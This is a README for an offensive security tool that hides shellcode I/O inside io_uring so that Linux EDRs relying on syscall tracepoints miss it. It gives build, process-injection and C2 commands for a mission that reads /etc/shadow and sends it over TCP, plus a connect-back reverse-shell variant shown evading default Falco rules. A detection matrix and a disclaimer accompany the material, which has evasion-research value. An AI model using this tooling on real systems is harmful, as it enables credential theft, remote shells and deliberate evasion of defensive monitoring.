# uring-shellcode

Linux EDRs that rely on `sys_enter` tracepoints are completely blind to I/O operations routed through io_uring — and this repository proves it with working shellcode.

## How it works

io_uring submits I/O through `io_issue_sqe()` → `vfs_read()` directly, never touching the `raw_tracepoint/sys_enter` hook that most EDRs instrument. The only syscall an EDR ever sees is a generic `io_uring_enter(fd, N, N, GETEVENTS)`.

```
Traditional I/O   →  EDR sees: openat()  read()  connect()  send()
io_uring I/O      →  EDR sees: io_uring_enter()   [all ops hidden inside]
```

The shellcode is structured in three layers:

| Layer | File | Size | Purpose |
|---|---|---|---|
| 0 | `layer0_bootstrap.asm` | ~150 bytes | `io_uring_setup` + 3× `mmap` (only visible syscalls) |
| 1 | `layer1_runtime.asm`   | ~400 bytes | `_get_sqe`, `_io_enter`, `_wait_cqe` engine |
| 2 | `missions/*.asm`       | ~300 bytes | Mission-specific op sequence |

## Quick Demo

```bash
# 1. Build everything
make

# 2. Terminal 1 — C2 listener
python3 testing/c2_server.py --port 4444 --verify /etc/shadow

# 3. Terminal 2 — generate shellcode with builder
python3 builder/uring_builder.py builder/missions/exfil_shadow.yaml \
    --ip 127.0.0.1 --port 4444

# 4. Terminal 2 — inject into a disposable process
sleep 60 &
sudo testing/injector/inject $! shellcode.bin
```

strace on the target will show zero `openat`, `read`, `connect`, or `send` calls. The file arrives at the C2.

## Detection Matrix

For the full per-mechanism results table, run `sudo testing/run_matrix.sh`
(it writes the generated report to `testing/results/edr_matrix.md`). Summary:

| Detection mechanism | Detects? |
|---|:---:|
| eBPF on `sys_enter` (Falco, most EDRs) | ✗ |
| kprobes on `sys_read` / `sys_openat`   | ✗ |
| LSM hooks (`security_file_open`)       | ✓ |
| Falcon Linux kernel sensor             | ⚠ version-dependent |
| seccomp blocking `io_uring_setup`      | ✓ |

Run `sudo testing/run_matrix.sh` to reproduce with your EDR stack — it
writes the generated table to `testing/results/edr_matrix.md`.

## Live EDR Demo with Falco

Run the connect-back variants under a real falco and watch what each one
leaves behind — full walkthrough in
[`testing/falco_setup.md`](testing/falco_setup.md). The demo below uses
**only the default falco ruleset** (no `-r`), validated live:

```bash
nasm -f bin -o /tmp/poc/cbsys.bin shellcode/connect_back_sys.asm   # syscall baseline
gcc -O0 -static -o /tmp/poc/runner testing/runner.c
python3 testing/c2_server.py --host 0.0.0.0 --port 4444            # C2 (host)
docker run -d --name flk --privileged --network host -e HOST_ROOT=/host \
  -v /tmp/poc:/lab:ro \
  -v /proc:/host/proc:ro -v /sys:/host/sys:ro -v /etc:/host/etc:ro \
  falcosecurity/falco:0.45.1-debian \
  falco -c /etc/falco/falco.yaml -o webserver.enabled=false
sleep 15; docker exec flk /lab/runner /lab/cbsys.bin
docker logs flk 2>&1 | grep "Redirect stdout/stdin"   # → 3 rows (one per dup2)
```

Swap in a uring variant (`python3 builder/uring_builder.py
builder/missions/connect_back.yaml --out /tmp/poc/cb_uring.bin --quiet`)
and run the same `docker exec` — **0 rows**: the dup2 syscalls are still
executed and traced, but the fd was created via io_uring so falco cannot
see it as a network socket (and the zero-exec variant produces nothing
at all). To also view the raw syscall chain beyond the stock rule, add
the `testing/falco_reverse_sh_poc.yaml` ruleset (see the walkthrough).
Captured side-by-side results:
[`testing/results/falco_edr_comparison.md`](testing/results/falco_edr_comparison.md).
A pre-recorded, scripted version of all three scenarios with the falco log
streaming live (typed commands, tmux layout, asciicast) ships in
[`testing/results/falco_demo.cast`](testing/results/falco_demo.cast):

```bash
uvx asciinema play testing/results/falco_demo.cast   # ~90 s, 190x40
```

## Repository Structure

```
uring-shellcode/
├── shellcode/
│   ├── combined/shellcode.asm   # Combined bootstrap + runtime + mission
│   ├── layer1_runtime.asm       # SQE/CQE engine (for builder)
│   ├── missions/exfil_shadow.asm
│   └── Makefile
├── builder/
│   ├── uring_builder.py         # YAML mission → shellcode.bin (--encode xor p/ sem nulls)
│   ├── missions/                # YAML mission definitions
│   └── tests/test_builder.py
├── testing/
│   ├── injector/inject_ptrace.c # ptrace-based process injector
│   ├── c2_server.py             # TCP listener for exfil validation
│   ├── run_matrix.sh            # EDR matrix runner
│   ├── falco_setup.md           # live-falco walkthrough (2 container layouts)
│   ├── falco_demo.sh            # scripted tmux demo driver (asciinema + live log)
│   ├── run_falco_poc.sh         # build + listener + runner helper
│   ├── falco_reverse_sh_poc.yaml# PoC ruleset (POC_REVSHELL)
│   └── results/                 # generated: edr_matrix.md + captured falco_edr_comparison.md
│                                 # + pre-recorded falco_demo.cast (uvx asciinema play)├── poc/                         # Standalone C PoCs (no assembly)
├── SPEC.md                      # Full technical specification
└── AGENTS.md                    # Claude Code / Codex agent instructions
```

## Requirements

- Linux x86_64, kernel ≥ 5.5 (for `IORING_OP_CONNECT` / `IORING_OP_SEND`)
- NASM ≥ 2.14
- Python ≥ 3.9 (`pip install pyyaml`)
- GCC (for injector and C PoCs)
- Root / `CAP_SYS_PTRACE` for injection tests

Install on Debian/Ubuntu:
```bash
sudo apt install nasm gcc python3-pip
pip install pyyaml pytest
```

## Phases

- [x] Phase 1 — C PoCs (`poc/`) demonstrating io_uring evasion
- [x] Phase 2 — x64 position-independent shellcode (Layer 0 + 1 + mission)
- [x] Phase 3 — Mission: `exfil_shadow` (read `/etc/shadow` → TCP send)
- [x] Phase 4 — DSL builder: YAML mission → shellcode.bin + C header
- [x] Phase 5 — Testing framework: ptrace injector + C2 server + EDR matrix
- [ ] Phase 6 — Additional missions and ARM64 port (see ROADMAP)

## Disclaimer

This tool is for **authorized security research and testing only**. Use it only on systems you own or have explicit written permission to test. The authors assume no liability for misuse. See [LICENSE](LICENSE).

## Author

**Maycon Vitali** — [@maycon](https://github.com/maycon)  
Founder, [Hack N' Roll](https://hacknroll.com) · DC5527 · OSCE · eMAPT · CRTE
